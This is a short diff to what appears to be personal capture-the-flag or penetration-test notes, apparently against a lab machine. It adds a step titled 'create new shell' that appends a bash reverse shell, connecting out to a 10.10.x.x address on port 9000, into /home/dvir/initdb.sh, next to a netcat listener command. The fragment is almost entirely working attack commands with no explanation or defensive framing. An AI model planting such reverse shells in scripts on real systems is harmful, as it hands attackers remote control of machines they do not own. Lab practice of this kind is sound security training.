@@ -16,4 +16,7 @@ netcat listner
 ```
 nc -lvnp 6666
 ```
-
+create new shell
+```
+echo '/bin/bash -c "bash -i >& /dev/tcp/10.10.xxx.xxx/9000 0>&1"' >> /home/dvir/initdb.sh
+```
